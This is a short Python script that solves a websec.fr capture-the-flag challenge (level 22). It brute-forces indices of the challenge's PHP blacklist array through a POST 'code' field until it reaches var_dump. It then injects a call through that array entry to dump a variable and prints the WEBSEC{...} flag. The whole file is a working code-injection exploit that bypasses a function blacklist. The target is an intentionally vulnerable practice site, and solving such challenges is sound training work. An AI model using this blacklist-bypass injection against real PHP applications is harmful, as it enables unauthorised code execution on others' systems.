from requests import *
from bs4 import BeautifulSoup

url = 'http://websec.fr/level22/index.php'

pos = 0
for i in range(1000):
    params = { 
        'code' : "$blacklist{%s}" % str(i)
    }
    
    res = post(url , params=params)
    soup  = BeautifulSoup(res.text , 'html.parser')
    command = soup.find('pre').get_text()
    command = command.lstrip()
    print(command)
    print(i)

    if command == 'var_dump':
        pos = i
        break

params = {
    'code' : '$blacklist{%s}($a)' % str(pos)
}

r = post(url , params=params)
pos = r.text.find('WEBSEC{')
while (True):
    txt = r.text[pos]
    print(txt , end='')
    if (txt == '}'):
        print()
        break

    pos += 1
